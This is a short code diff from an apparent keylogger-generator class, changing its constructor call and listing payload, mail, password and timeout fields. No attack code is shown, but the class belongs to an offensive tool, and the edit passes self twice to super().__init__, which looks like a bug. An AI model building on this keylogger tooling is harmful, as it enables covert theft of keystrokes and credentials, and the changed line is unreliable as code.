@@ -14,7 +14,7 @@ class KeyloggerGenerator(ModuleUtils):
         Initializes the payload, mail, password, and timeout attributes.
         """
 
-        super().__init__()
+        super().__init__(self)
         self.payload  = ""
         self.mail     = ""
         self.password = ""
